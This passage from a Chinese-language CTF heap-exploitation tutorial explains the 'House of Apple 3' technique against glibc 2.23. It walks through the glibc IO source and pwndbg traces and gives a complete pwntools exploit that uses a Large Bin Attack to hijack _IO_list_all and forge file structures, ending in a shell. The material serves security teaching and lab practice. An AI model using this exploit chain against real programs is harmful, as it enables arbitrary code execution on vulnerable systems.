4.  **满足“宽字符缓冲区未分配”条件**：在绕过上述检查后，执行流判断 `if (fp->_wide_data->_IO_buf_base == NULL)`。在伪造的`_IO_wide_data`结构中，我们**将`_IO_buf_base`字段显式设置为`NULL`**。这标识着宽字符缓冲区尚未分配，从而使条件成立，进入缓冲区分配分支。

5.  **绕过“存在已保存缓冲区”检查**：在该分支中，函数继续检查 `if (fp->_wide_data->_IO_save_base != NULL)`。我们在伪造时**将`_IO_save_base`字段设为`NULL`**，使得此条件不成立，防止执行流进入无关的恢复路径。

在成功通过上述所有“关卡”后，执行流最终抵达对 **`_IO_wdoallocbuf (fp);`** 的调用。这标志着控制流已完全按照此前的设计，从复杂的IO状态处理逻辑中脱离，正式进入旨在触发任意代码执行的关键函数链（`_IO_wdoallocbuf` -> `_IO_WDOALLOCATE` -> `_wide_vtable->__doallocate`）的下一环节。

```bash
In file: /home/bogon/workSpaces/glibc/libio/wfileops.c:388
   382       /* Maybe we already have a push back pointer.  */
   383       if (fp->_wide_data->_IO_save_base != NULL)
   384         {
   385           free (fp->_wide_data->_IO_save_base);
   386           fp->_flags &= ~_IO_IN_BACKUP;
   387         }
 ► 388       _IO_wdoallocbuf (fp);
```

当执行流进入 **`_IO_wdoallocbuf`** 函数后，能否顺利抵达最终的目标函数调用，取决于对伪造文件流状态的最后几项校验。由于前期的数据布局极为精确，以下校验被逐一通过：

1.  **通过宽缓冲区基址检查**：函数首先验证宽字符缓冲区是否已初始化，即检查 `fp->_wide_data->_IO_buf_base`。在伪造的`_IO_wide_data`结构中，此字段被**显式设置为`NULL`**。这表示缓冲区尚未分配，条件成立，执行流因此进入分配分支。

2.  **满足缓冲模式要求**：接着，函数检查文件流是否处于无缓冲模式，即判断 `fp->_flags & _IO_UNBUFFERED`。在伪造的`_flags`中， **`_IO_UNBUFFERED`标志位未被置位**，这使得文件流被识别为需要缓冲，条件满足，执行流继续推进。

成功通过上述最终校验后，函数调用 **`_IO_WDOALLOCATE (fp)`** 宏。此宏展开后，本质是调用`_IO_wide_data`关联的虚表（`_wide_vtable`）中的 **`__doallocate`** 函数指针。

由于该虚表及函数指针已完全被控制，并预先设置为目标地址（如`system`或`one_gadget`），因此此调用即直接跳转至目标函数执行。若目标为`system`，且参数（由伪造`_flags`嵌入的`”sh”`字符串）已准备就绪，则可成功**获取shell控制权**。至此，从初始堆布局、信息泄露、Large Bin Attack劫持全局指针，到伪造IO结构并引导复杂的IO处理链，最终实现任意代码执行的完整利用链路宣告完成。

```bash
In file: /home/bogon/workSpaces/glibc/libio/wgenops.c:390
   384 void
   385 _IO_wdoallocbuf (_IO_FILE *fp)
   386 {
   387   if (fp->_wide_data->_IO_buf_base)
   388     return;
   389   if (!(fp->_flags & _IO_UNBUFFERED))
 ► 390     if ((wint_t)_IO_WDOALLOCATE (fp) != WEOF)
 
 ► 0x7d42d2e6575a <_IO_wdoallocbuf+30>    call   qword ptr [rax + 0x68]      <system>
        command: 0x63c1c5be4940 ◂— 0x68737c7cf7f5
```

### 1-36 house of apple其三

在glibc 2.24引入对`_IO_FILE_plus`虚表的严格检查后，**House of Apple**的一种变体利用方法能够有效绕过该防护。其核心在于，**将堆漏洞提供的任意地址写原语，与glibc内部另一组合法但非常规的宽字符IO跳转表（`_IO_wstrn_jumps`及其变体）相结合**，构造一条能够通过验证的、涉及两级IO结构的复杂利用链。

完整的利用流程可系统地划分为以下三个阶段：

**阶段一：获取关键的原语**
首先，通过**Large Bin Attack**等堆利用技术，获得一次关键的**任意地址写**能力。此原语用于向关键全局地址`_IO_list_all`写入一个可控的堆地址，从而劫持IO链表，这是启动后续利用的先决条件。

**阶段二：伪造两级IO结构并串联**
利用获得的写原语，执行以下核心操作：
1.  **劫持IO链表头**：将全局IO流链表头指针`_IO_list_all`修改为指向在堆上预先精心布置的第一级伪造`_IO_FILE_plus`结构。
2.  **设置第一级结构的合法虚表**：**（技术的核心与绕过关键）** 在该第一级伪造的`_IO_FILE_plus`结构中，将其虚表（`vtable`）指针设置为glibc内部合法的**`_IO_wstrn_jumps`**符号地址。由于该地址位于glibc认可的合法vtable内存区间内，因此能通过严格的虚表范围检查。`_IO_wmem_jumps`或`_IO_wstr_jumps`可作为功能相同的替代品。
3.  **设置`_chain`指针以串联第二级结构**：将第一级结构中的`_chain`指针指向预先布置的第二级伪造`_IO_FILE_plus`结构。这确保了在完成第一级结构的处理后，执行流能继续遍历到我们控制的第二级结构。
4.  **构造第一级结构的执行路径**：精心设置第一级结构的`_flags`等字段，使其在执行`_IO_OVERFLOW`（指向`_IO_wstrn_jumps`表中的`_IO_wdefault_doallocate`）后，能够满足条件，使`more`变量不为0，从而确保执行流能继续进入`__wunderflow`路径，并最终通过`_chain`指针进入第二级结构。
5.  **构造第二级完整的伪造结构**：在第二级伪造的`_IO_FILE_plus`结构及其关联的`_IO_wide_data`结构中精确布置字段：
    *   **设置`_flags`字段**：将其赋值为`b”\x01\x08||sh\x00\x00″`。此值经过精心设计，旨在通过`_IO_wdefault_xsgetn`等函数内部的校验，同时嵌入字符串`”sh”`为最终的`system`调用提供参数。
    *   将`_IO_FILE_plus`结构中的`_wide_data`指针指向一个可控的、伪造的`_IO_wide_data`结构。
    *   在该伪造的`_IO_wide_data`结构中，将其虚表（`_wide_vtable`）指针指向一个可控的内存区域，并将`_wide_vtable`中的`__overflow`函数项设置为最终目标函数地址（如`system`或`one_gadget`）。

**阶段三：触发调用链执行代码**
最终，当程序因调用`abort()`、`exit()`或满足缓冲区刷新条件而触发`_IO_flush_all_lockp`函数时，该函数会遍历已被污染的IO链表。对于链表中第一级伪造的文件流，其`_IO_OVERFLOW`函数指针实际指向`_IO_wstrn_jumps`表中的**`_IO_wdefault_doallocate`**函数。执行此函数后，将成功设置条件使`more != 0`，并引导至`__wunderflow`，进而通过`_chain`进入第二级结构。

对于第二级伪造的文件流，其`_IO_OVERFLOW`函数指针实际指向`_IO_wstrn_jumps`表中的 **`_IO_wdefault_xsgetn`**函数。通过精确控制伪造的结构字段，可以引导执行流程依次通过 **`_IO_wdefault_xsgetn` -> `__wunderflow` -> `_IO_switch_to_wget_mode`**，最终调用`_IO_WOVERFLOW`（即`_wide_vtable->__overflow`），从而将控制流导向指定的函数（如`system("/bin/sh")`），实现任意代码执行。

相关glibc完整源码参见[wgenops.c](https://elixir.bootlin.com/glibc/glibc-2.23/source/libio/wgenops.c#L376)：

```c
const struct _IO_jump_t _IO_wstrn_jumps attribute_hidden =
{
  JUMP_INIT_DUMMY,
  JUMP_INIT(finish, _IO_wstr_finish),
  JUMP_INIT(overflow, (_IO_overflow_t) _IO_wstrn_overflow),
  JUMP_INIT(underflow, (_IO_underflow_t) _IO_wstr_underflow),
  JUMP_INIT(uflow, (_IO_underflow_t) _IO_wdefault_uflow),
  JUMP_INIT(pbackfail, (_IO_pbackfail_t) _IO_wstr_pbackfail),
  JUMP_INIT(xsputn, _IO_wdefault_xsputn),
  JUMP_INIT(xsgetn, _IO_wdefault_xsgetn),
  JUMP_INIT(seekoff, _IO_wstr_seekoff),
  JUMP_INIT(seekpos, _IO_default_seekpos),
  JUMP_INIT(setbuf, _IO_default_setbuf),
  JUMP_INIT(sync, _IO_default_sync),
  JUMP_INIT(doallocate, _IO_wdefault_doallocate),
  JUMP_INIT(read, _IO_default_read),
  JUMP_INIT(write, _IO_default_write),
  JUMP_INIT(seek, _IO_default_seek),
  JUMP_INIT(close, _IO_default_close),
  JUMP_INIT(stat, _IO_default_stat),
  JUMP_INIT(showmanyc, _IO_default_showmanyc),
  JUMP_INIT(imbue, _IO_default_imbue)
};

static const struct _IO_jump_t _IO_wmem_jumps =
{
  JUMP_INIT_DUMMY,
  JUMP_INIT (finish, _IO_wmem_finish),
  JUMP_INIT (overflow, (_IO_overflow_t) _IO_wstr_overflow),
  JUMP_INIT (underflow, (_IO_underflow_t) _IO_wstr_underflow),
  JUMP_INIT (uflow, (_IO_underflow_t) _IO_wdefault_uflow),
  JUMP_INIT (pbackfail, (_IO_pbackfail_t) _IO_wstr_pbackfail),
  JUMP_INIT (xsputn, _IO_wdefault_xsputn),
  JUMP_INIT (xsgetn, _IO_wdefault_xsgetn),
  JUMP_INIT (seekoff, _IO_wstr_seekoff),
  JUMP_INIT (seekpos, _IO_default_seekpos),
  JUMP_INIT (setbuf, _IO_default_setbuf),
  JUMP_INIT (sync, _IO_wmem_sync),
  JUMP_INIT (doallocate, _IO_wdefault_doallocate),
  JUMP_INIT (read, _IO_default_read),
  JUMP_INIT (write, _IO_default_write),
  JUMP_INIT (seek, _IO_default_seek),
  JUMP_INIT (close, _IO_default_close),
  JUMP_INIT (stat, _IO_default_stat),
  JUMP_INIT (showmanyc, _IO_default_showmanyc),
  JUMP_INIT (imbue, _IO_default_imbue)
};

const struct _IO_jump_t _IO_wstr_jumps =
{
  JUMP_INIT_DUMMY,
  JUMP_INIT(finish, _IO_wstr_finish),
  JUMP_INIT(overflow, (_IO_overflow_t) _IO_wstr_overflow),
  JUMP_INIT(underflow, (_IO_underflow_t) _IO_wstr_underflow),
  JUMP_INIT(uflow, (_IO_underflow_t) _IO_wdefault_uflow),
  JUMP_INIT(pbackfail, (_IO_pbackfail_t) _IO_wstr_pbackfail),
  JUMP_INIT(xsputn, _IO_wdefault_xsputn),
  JUMP_INIT(xsgetn, _IO_wdefault_xsgetn),
  JUMP_INIT(seekoff, _IO_wstr_seekoff),
  JUMP_INIT(seekpos, _IO_default_seekpos),
  JUMP_INIT(setbuf, _IO_default_setbuf),
  JUMP_INIT(sync, _IO_default_sync),
  JUMP_INIT(doallocate, _IO_wdefault_doallocate),
  JUMP_INIT(read, _IO_default_read),
  JUMP_INIT(write, _IO_default_write),
  JUMP_INIT(seek, _IO_default_seek),
  JUMP_INIT(close, _IO_default_close),
  JUMP_INIT(stat, _IO_default_stat),
  JUMP_INIT(showmanyc, _IO_default_showmanyc),
  JUMP_INIT(imbue, _IO_default_imbue)
};

_IO_size_t
_IO_wdefault_xsgetn (_IO_FILE *fp, void *data, _IO_size_t n)
{
  _IO_size_t more = n;
  wchar_t *s = (wchar_t*) data;
  for (;;)
    {
      /* Data available. */
      _IO_ssize_t count = (fp->_wide_data->_IO_read_end
			   - fp->_wide_data->_IO_read_ptr);
      if (count > 0)
	{
	  if ((_IO_size_t) count > more)
	    count = more;
	  if (count > 20)
	    {
#ifdef _LIBC
	      s = __wmempcpy (s, fp->_wide_data->_IO_read_ptr, count);
#else
	      memcpy (s, fp->_wide_data->_IO_read_ptr, count);
	      s += count;
#endif
	      fp->_wide_data->_IO_read_ptr += count;
	    }
	  else if (count <= 0)
	    count = 0;
	  else
	    {
	      wchar_t *p = fp->_wide_data->_IO_read_ptr;
	      int i = (int) count;
	      while (--i >= 0)
		*s++ = *p++;
	      fp->_wide_data->_IO_read_ptr = p;
            }
            more -= count;
        }
      if (more == 0 || __wunderflow (fp) == WEOF)
	break;
    }
  return n - more;
}
libc_hidden_def (_IO_wdefault_xsgetn)

wint_t
__wunderflow (_IO_FILE *fp)
{
  if (fp->_mode < 0 || (fp->_mode == 0 && _IO_fwide (fp, 1) != 1))
    return WEOF;

  if (fp->_mode == 0)
    _IO_fwide (fp, 1);
  if (_IO_in_put_mode (fp))
    if (_IO_switch_to_wget_mode (fp) == EOF)
      return WEOF;
  if (fp->_wide_data->_IO_read_ptr < fp->_wide_data->_IO_read_end)
    return *fp->_wide_data->_IO_read_ptr;
  if (_IO_in_backup (fp))
    {
      _IO_switch_to_main_wget_area (fp);
      if (fp->_wide_data->_IO_read_ptr < fp->_wide_data->_IO_read_end)
	return *fp->_wide_data->_IO_read_ptr;
    }
  if (_IO_have_markers (fp))
    {
      if (save_for_wbackup (fp, fp->_wide_data->_IO_read_end))
	return WEOF;
    }
  else if (_IO_have_backup (fp))
    _IO_free_wbackup_area (fp);
  return _IO_UNDERFLOW (fp);
}
libc_hidden_def (__wunderflow)

int
_IO_switch_to_wget_mode (_IO_FILE *fp)
{
  if (fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base)
    if ((wint_t)_IO_WOVERFLOW (fp, WEOF) == WEOF)
      return EOF;
  if (_IO_in_backup (fp))
    fp->_wide_data->_IO_read_base = fp->_wide_data->_IO_backup_base;
  else
    {
      fp->_wide_data->_IO_read_base = fp->_wide_data->_IO_buf_base;
      if (fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_read_end)
	fp->_wide_data->_IO_read_end = fp->_wide_data->_IO_write_ptr;
    }
  fp->_wide_data->_IO_read_ptr = fp->_wide_data->_IO_write_ptr;

  fp->_wide_data->_IO_write_base = fp->_wide_data->_IO_write_ptr
    = fp->_wide_data->_IO_write_end = fp->_wide_data->_IO_read_ptr;

  fp->_flags &= ~_IO_CURRENTLY_PUTTING;
  return 0;
}
libc_hidden_def (_IO_switch_to_wget_mode)

#define _IO_WOVERFLOW(FP, CH) WJUMP1 (__overflow, FP, CH)
#define WJUMP1(FUNC, THIS, X1) (_IO_WIDE_JUMPS_FUNC(THIS)->FUNC) (THIS, X1)

int
_IO_wdefault_doallocate (_IO_FILE *fp)
{
  wchar_t *buf;

  buf = malloc (_IO_BUFSIZ);
  if (__glibc_unlikely (buf == NULL))
    return EOF;
  _IO_wsetb (fp, buf, buf + _IO_BUFSIZ, 1);
  return 1;
}
libc_hidden_def (_IO_wdefault_doallocate)

void
_IO_wsetb (_IO_FILE *f, wchar_t *b, wchar_t *eb, int a)
{
  if (f->_wide_data->_IO_buf_base && !(f->_flags2 & _IO_FLAGS2_USER_WBUF))
    free (f->_wide_data->_IO_buf_base);
  f->_wide_data->_IO_buf_base = b;
  f->_wide_data->_IO_buf_end = eb;
  if (a)
    f->_flags2 &= ~_IO_FLAGS2_USER_WBUF;
  else
    f->_flags2 |= _IO_FLAGS2_USER_WBUF;
}
libc_hidden_def (_IO_wsetb)
```

本方法的成功执行，最终依赖于glibc内部一条从堆错误处理到IO流刷新的确定性路径。具体流程如下：

**触发错误与启动IO刷新**
通过触发堆分配器错误（例如故意双重释放一个已位于large bin中的块）来引发 **`malloc_printerr`** 函数的调用。该函数在准备输出错误信息时，会调用 **`_IO_flush_all_lockp`**，强制刷新所有已打开的IO流。

**遍历被劫持的IO链表**
`_IO_flush_all_lockp` 函数会遍历由全局指针 `_IO_list_all` 管理的IO链表。由于该指针此前已被Large Bin Attack劫持，因此遍历从此前伪造的第一级 `_IO_FILE_plus` 结构开始。对于链表中的每个文件流，该函数会调用其虚表（vtable）中定义的 **`_IO_OVERFLOW`** 函数。

**两级利用链中的关键函数及作用**
由于伪造结构中的虚表被设置为 **`_IO_wstrn_jumps`**，实际引发的函数调用形成了一个精心设计的链条：

1.  **`_IO_wdefault_doallocate`** （第一级 `_IO_OVERFLOW`）：
    *   **作用**：这是第一级伪造结构虚表中的`_IO_OVERFLOW`项所指向的函数。它主要用于为宽字符流执行默认的缓冲区分配操作。
    *   **在利用中的角色**：其执行过程会调用 **`_IO_wsetb`** 等辅助函数。 **`_IO_wsetb`的调用具有关键作用**：它实际完成了对特定寄存器和内部状态的设置。其中，最重要的效果之一是确保了关键的内部状态变量满足条件，特别是为后续判断所依赖的`rdx`寄存器设置了一个非零值，从而实质性地促成了 `more != 0` 的条件成立。这使得执行流不会提前返回，而是能够继续进入 `__wunderflow` 路径，并通过第一级结构中的 `_chain` 指针，顺利跳转到精心布置的第二级伪造 `_IO_FILE_plus` 结构。

2.  **`_IO_wdefault_xsgetn`** （第二级 `_IO_OVERFLOW`）：
    *   **作用**：这是第二级伪造结构虚表中的`_IO_OVERFLOW`项所指向的函数。它负责处理宽字符流的输入操作（“get”区域），尝试从流中获取一定数量的字符。
    *   **在利用中的角色**：通过为第二级结构设置的特定 `_flags`（如`b”\x01\x08||sh\x00\x00″`）和其他字段，该函数的执行被引导至需要更多数据的路径，从而进一步调用 `__wunderflow` 来尝试满足输入请求。

3.  **`__wunderflow`**：
    *   **作用**：一个内部的宽字符流“下溢”函数，当读取缓冲区耗尽时被调用，以从底层源获取更多数据。
    *   **在利用中的角色**：在此特定伪造状态下，它的执行会触发模式切换，调用 `_IO_switch_to_wget_mode` 来将流状态切换到“获取模式”。

4.  **`_IO_switch_to_wget_mode`**：
    *   **作用**：将宽字符流切换到读取（get）模式。
    *   **在利用中的角色**：此函数是到达最终目标的关键跳板。在切换模式后，它会调用该文件流的 `_IO_WOVERFLOW` 函数。

5.  **`_IO_WOVERFLOW`**：
    *   **作用**：这是 `_IO_wide_data` 结构关联的虚表（`_wide_vtable`）中的一个函数指针，通常对应 `__overflow` 项。
    *   **在利用中的角色**：**这是整个利用链的终点**。通过完全控制第二级结构的 `_wide_data` 及其 `_wide_vtable`，已将 `_IO_WOVERFLOW`（即 `_wide_vtable->__overflow`）指针设置为目标函数地址（如`system`）。因此，对此函数的调用即等同于调用 `system(“/bin/sh”)`，从而获得shell。

**完整的控制流路径总结**
因此，从触发错误到执行任意代码的完整控制流路径为：
**`malloc_printerr` → `_IO_flush_all_lockp` → 第一级`_IO_OVERFLOW` (`_IO_wdefault_doallocate`) → `_IO_wsetb` (及辅助调用) → 通过`_chain`进入第二级结构 → 第二级`_IO_OVERFLOW` (`_IO_wdefault_xsgetn`) → `__wunderflow` → `_IO_switch_to_wget_mode` → `_IO_WOVERFLOW` (`_wide_vtable->__overflow`) → 可控的函数（如`system`）**。

通过将 `_wide_vtable->__overflow` 指向预定目标，最终完成了从堆内存破坏到任意代码执行的复杂利用链。

测试的二进制源码参考[binary.c](https://github.com/BinRacer/pwn4heap/tree/master/src/2.23/binary/14/binary.c)，相关exoloit.py完整内容可见[exploit.py](https://github.com/BinRacer/pwn4heap/blob/master/src/2.23/house_of_apple_three/exploit.py)。

核心利用代码如下：

```python
# house of apple three
conn.sendafter(b"Enter author name: ", b"A" * 0x8)
malloc(0, 0x420)
malloc(1, 0x500)
malloc(2, 0x400)
delete(0)
malloc(3, 0x500)
content = show(0)
main_arena1096 = u64(content[:6].ljust(8, b"\x00"))
log.info(f"main_arena+1096: {hex(main_arena1096)}")
libc.address = main_arena1096 - 0x38DF68
log.info(f"libc base: {hex(libc.address)}")
system = libc.sym["system"]
log.info(f"system addr: {hex(system)}")
_IO_wstrn_jumps = libc.sym["_IO_wstrn_jumps"]
log.info(f"_IO_wstrn_jumps addr: {hex(_IO_wstrn_jumps)}")
_IO_list_all = libc.sym["_IO_list_all"]
log.info(f"_IO_list_all addr: {hex(_IO_list_all)}")

payload = b"A" * 0x10 + b"A"
edit(0, len(payload), payload)
content = show(0)
chunk0_addr = u64(content[0x10 : 0x10 + 6].ljust(8, b"\x00")) - ord("A")
log.info(f"chunk0 addr: {hex(chunk0_addr)}")
chunk2_addr = chunk0_addr + 0x420 + 0x10 + 0x500 + 0x10
log.info(f"chunk2 addr: {hex(chunk2_addr)}")
chunk3_addr = chunk2_addr + 0x400 + 0x10
log.info(f"chunk3 addr: {hex(chunk3_addr)}")

delete(2)
payload = p64(main_arena1096) + p64(_IO_list_all - 0x10)
payload += p64(chunk0_addr) + p64(_IO_list_all - 0x20)
edit(0, len(payload), payload)
malloc(4, 0x500)

fake_io = b"\x00" * (0x20 - 0x10) + p64(2)
fake_io = fake_io.ljust(0x28 - 0x10, b"\x00") + p64(3)
fake_io = fake_io.ljust(0x68 - 0x10) + p64(chunk3_addr + 0x10)
fake_io = fake_io.ljust(0xA0 - 0x10, b"\x00") + p64(chunk2_addr + 0x200)
fake_io = fake_io.ljust(0xC0 - 0x10) + p64(0)
fake_io = fake_io.ljust(0xD8 - 0x10, b"\x00") + p64(_IO_wstrn_jumps + 0x50)
fake_wide_data = b"\x00" * 0x30 + p64(0)
fake_io = fake_io.ljust(0x200 - 0x10, b"\x00") + fake_wide_data
edit(2, len(fake_io), fake_io)

fake_wide_data = p64(0) + p64(0)
fake_wide_data = fake_wide_data.ljust(0x18, b"\x00") + p64(2)
fake_wide_data = fake_wide_data.ljust(0x20, b"\x00") + p64(3)
fake_wide_data = fake_wide_data.ljust(0x130, b"\x00") + p64(chunk0_addr + 0x200)
payload = b"\x00" * 0x20 + fake_wide_data
fake_wide_vtable = b"\x00" * 0x18 + p64(system)
payload = payload.ljust(0x200 - 0x10, b"\x00") + fake_wide_vtable
edit(0, len(payload), payload)
# pwndbg> p/x (uint16_t)(0x800)
# $2 = 0x800
# pwndbg>
fake_io = b"\x01\x08||sh\x00\x00"
fake_io = fake_io.ljust(0x20, b"\x00") + p64(2)
fake_io = fake_io.ljust(0x28, b"\x00") + p64(3)
fake_io = fake_io.ljust(0xA0, b"\x00") + p64(chunk0_addr + 0x30)
fake_io = fake_io.ljust(0xC0, b"\x00") + p64(1)
fake_io = fake_io.ljust(0xD8, b"\x00") + p64(_IO_wstrn_jumps + 0x28)
edit(3, len(fake_io), fake_io)
delete(0)
conn.recvline()
conn.recvline()
cmd = b"cat src/2.23/house_of_apple_three/flag\x00"
conn.sendline(cmd)
flag = conn.recvline().decode().strip()
log.success(f"flag: {format_flag(flag)}")
```

在堆漏洞利用的初期，获取目标进程的内存布局信息至关重要。一种高效的技术是引导一个空闲堆块从**unsorted bin**迁移至**large bin**，利用后者特有的元数据同时泄露**libc基址**与**堆地址**。

**完整的操作与原理如下：**

1.  **构造初始堆状态**
    首先连续分配三个堆块：`chunk[0]`、`chunk[1]`和`chunk[2]`。令`chunk[1]`位于`chunk[0]`与`chunk[2]`之间，以防止它们物理合并。关键之处在于设定`chunk[0]`的尺寸大于`chunk[2]`的尺寸，这使得`chunk[0]`足够大，能够在后续操作中被归类到large bin。

2.  **将块置入Unsorted Bin**
    接着释放`chunk[0]`。由于其尺寸超过fast bin上限且不与top chunk相邻，它被放入**unsorted bin**。此时，分配器会将其`fd`和`bk`指针设置为指向`main_arena`内部的特定地址，此地址与libc的加载基址之间存在一个固定的偏移量。

3.  **触发向Large Bin的转移**
    随后，程序申请一个尺寸大于`chunk[0]`的新堆块`chunk[3]`。由于unsorted bin中的`chunk[0]`无法满足此次较大的分配请求，分配器会对其进行整理。鉴于其较大的尺寸，`chunk[0]`被从unsorted bin中移除，并插入到对应的**large bin**链表中。

4.  **利用Large Bin的元数据布局**
    large bin中的堆块除了拥有标准的`fd`和`bk`指针用于双向链表连接外，还额外包含一对`fd_nextsize`和`bk_nextsize`指针，用于在大小不同的块之间快速索引。当`chunk[0]`被放入一个**空的large bin**，或成为其所在尺寸区间内的 **第一个块**时，其`fd_nextsize`和`bk_nextsize`指针会被初始化为指向其自身的堆地址。因此，此刻`chunk[0]`的元数据中同时保存了两种关键指针：
    *   `fd`和`bk`：指向`main_arena`中的地址（**与libc相关**）。
    *   `fd_nextsize`和`bk_nextsize`：指向`chunk[0]`自身的地址（**即堆地址**）。

5.  **提取并计算关键地址**
    最后，通过程序可能存在的“读”功能（例如`show(0)`）输出`chunk[0]`用户数据区的内容。由于该块处于空闲状态，其用户数据区起始部分已被上述指针覆盖。从输出中可以直接解析出：
    *   从`fd`或`bk`的值，计算出`main_arena`的地址，减去已知的固定偏移即可得到**libc的基址**。
    *   从`fd_nextsize`或`bk_nextsize`的值，直接得到**该堆块所在的堆内存地址**。

至此，在无需任何初始地址信息的情况下，同时获取了后续利用所必需的libc基址和堆内存布局地址，为实施进一步的利用（如Large Bin Attack）奠定了坚实的基础。

```bash
pwndbg> heap
Free chunk (largebins) | PREV_INUSE
Addr: 0x629dfb14e000
Size: 0x430 (with flag bits: 0x431)
fd: 0x731c74b8df68
bk: 0x731c74b8df68
fd_nextsize: 0x629dfb14e000
bk_nextsize: 0x629dfb14e000

Allocated chunk
Addr: 0x629dfb14e430
Size: 0x510 (with flag bits: 0x510)

Allocated chunk | PREV_INUSE
Addr: 0x629dfb14e940
Size: 0x410 (with flag bits: 0x411)

Allocated chunk | PREV_INUSE
Addr: 0x629dfb14ed50
Size: 0x510 (with flag bits: 0x511)

Top chunk | PREV_INUSE
Addr: 0x629dfb14f260
Size: 0x1fda0 (with flag bits: 0x1fda1)

pwndbg> largebins 
largebins
0x400-0x430: 0x629dfb14e000 —▸ 0x731c74b8df68 (main_arena+1096) ◂— 0x629dfb14e000
pwndbg> 
```

在获取关键的libc与堆地址后，利用流程进入核心的构造阶段。接下来，将利用**Large Bin Attack**这一强大原语，在一次操作中向两个目标地址写入可控的堆地址，从而为后续的利用铺平道路。

**利用的具体实施步骤如下：**

1.  **准备利用载体**：首先释放之前预留的`chunk[2]`。由于其尺寸适中，它将被置入**unsorted bin**，成为后续链表操作中将被转移的“载体”块（victim）。

2.  **污染Large Bin的链表指针**：利用已有的堆内存写能力，修改仍然位于**large bin**中的`chunk[0]`的关键元数据。这是利用成功的前提：
    *   将`chunk[0]`的`bk`（后向）指针修改为`_IO_list_all - 0x10`。`_IO_list_all`是管理所有IO文件流的全局链表头，劫持它是后续进行IO流利用（如House of Apple）的关键。
    *   将`chunk[0]`的`bk_nextsize`（大尺寸后向）指针修改为`target2`。第二个目标`target2`可根据利用策略灵活选择，例如设为`_IO_list_all - 0x20`以辅助伪造IO结构，或设为`global_max_fast`以扰乱堆分配器行为。

3.  **通过分配触发利用**：程序随后申请一个较大的新堆块`chunk[4]`，其大小需同时大于`chunk[2]`和`chunk[0]`的尺寸。这个条件确保了分配器无法直接使用现有的空闲块，必须对unsorted bin进行整理。

    在整理过程中，分配器会将`chunk[2]`（victim）从unsorted bin中取出，并试图按其大小插入`chunk[0]`所在的large bin链表。**正是这个插入操作，触发了两次关键的任意地址写入**：
    *   **首次写入（劫持IO链表）**：根据双向链表的维护规则，会执行操作`victim->bk->fd = victim`。由于`victim->bk`已被我们污染为`_IO_list_all - 0x10`，此操作实际等价于 **`*_IO_list_all = victim`**。结果，全局IO链表头`_IO_list_all`被篡改为指向`chunk[2]`。
    *   **二次写入（污染辅助目标）**：根据large bin特有的`fd_nextsize`/`bk_nextsize`链表维护规则，会执行操作`victim->bk_nextsize->fd_nextsize = victim`。由于`victim->bk_nextsize`指向`target2`，此操作向 **`*(target2 + 0x20)`** 写入了`victim`的地址。

**利用效果**：
至此，一次精心布局的Large Bin Attack成功实现了双重效果：
1.  **核心劫持**：`_IO_list_all`指针被成功劫持，指向了可控的堆内存（`chunk[2]`），使得后续可以完全控制IO链表的遍历起点。
2.  **辅助破坏**：在第二个可控目标地址（`target2 + 0x20`）写入了一个堆地址。这为进一步的内存布局破坏或利用创造了额外条件，增强了整个利用链的灵活性和威力。

此步骤标志着从信息收集阶段，正式进入了主动篡改关键全局数据结构、构建恶意执行环境的新阶段。

```bash
pwndbg> x/1gx &_IO_list_all
0x731c74b8e540 <__GI__IO_list_all>:     0x0000629dfb14e940
pwndbg> x/10gx chunks
0x629df7561060 <chunks>:        0x0000000000000020      0x0000629dfb14e010
0x629df7561070 <chunks+16>:     0x0000000000000500      0x0000629dfb14e440
0x629df7561080 <chunks+32>:     0x0000000000000400      0x0000629dfb14e950
0x629df7561090 <chunks+48>:     0x0000000000000500      0x0000629dfb14ed60
0x629df75610a0 <chunks+64>:     0x0000000000000500      0x0000629dfb14f270
pwndbg> 
```

在成功将`_IO_list_all`全局指针劫持为指向`chunk[2]`后，利用流程进入最关键的**数据构造阶段**。此时，需要在`chunk[2]`所指向的堆内存中，精心布置**第一级伪造的`_IO_FILE_plus`结构**，其核心字段设置如下：

1.  **设置虚表（vtable）指针**：将`vtable`指针设置为 **`_IO_wstrn_jumps + 0x50`**。此偏移量经过精确计算，使得该结构体中的`_IO_OVERFLOW`函数指针实际指向跳转表中的 **`_IO_wdefault_doallocate`** 函数。这是启动整个利用链条的**关键入口点**。

2.  **设置`_chain`指针以串联第二级结构**：将`_chain`指针设置为`chunk3_addr + 0x10`，此地址指向预先布置的 **第二级伪造`_IO_FILE_plus`结构**。这确保了在第一级结构处理完毕后，IO链表的遍历能无缝跳转到我们完全控制的下一阶段，是构建多级利用链的桥梁。

3.  **设置`_wide_data`指针以操控关键执行路径**：将`_wide_data`指针指向`chunk2_addr + 0x200`。这是**整个利用中至关重要的布局**。该地址指向一个我们精心构造的`_IO_wide_data`结构。其核心作用在于，当第一级结构的`_IO_OVERFLOW`（`_IO_wdefault_doallocate`）被调用时，它会进一步调用 **`_IO_wsetb`** 函数。`_IO_wsetb`函数会引用`_wide_data`指针所指向的结构，并通过操作其中特定的字段，最终达成一个至关重要的效果：**成功修改`rdx`寄存器的值，使其不为零**。这个条件（`rdx != 0`）正是满足后续`__wunderflow`函数内部`more != 0`判断、从而使执行流得以继续沿着`_chain`进入第二级结构，而非提前返回的**决定性因素**。

至此，第一级伪造结构完成了它的核心使命：通过一个合法的虚表入口，将控制流导入；并通过操控`_wide_data`，利用内部函数`_IO_wsetb`修改关键寄存器状态，为执行流顺利过渡到下一阶段（第二级结构）扫清了障碍，做好了全部准备。

```bash
pwndbg> p/x *(struct _IO_FILE_plus*)_IO_list_all
$1 = {
  file = {
    _flags = 0x0,
    _IO_read_ptr = 0x411,
    _IO_read_end = 0x0,
    _IO_read_base = 0x0,
    _IO_write_base = 0x2,
    _IO_write_ptr = 0x3,
    _IO_write_end = 0x2020202020202020,
    _IO_buf_base = 0x2020202020202020,
    _IO_buf_end = 0x2020202020202020,
    _IO_save_base = 0x2020202020202020,
    _IO_backup_base = 0x2020202020202020,
    _IO_save_end = 0x2020202020202020,
    _markers = 0x2020202020202020,
    _chain = 0x629dfb14ed60,
    _fileno = 0x0,
    _flags2 = 0x0,
    _old_offset = 0x0,
    _cur_column = 0x0,
    _vtable_offset = 0x0,
    _shortbuf = {0x0},
    _lock = 0x0,
    _offset = 0x0,
    _codecvt = 0x0,
    _wide_data = 0x629dfb14eb40,
    _freeres_list = 0x2020202020202020,
    _freeres_buf = 0x2020202020202020,
    __pad5 = 0x2020202020202020,
    _mode = 0x0,
    _unused2 = {0x0 <repeats 20 times>}
  },
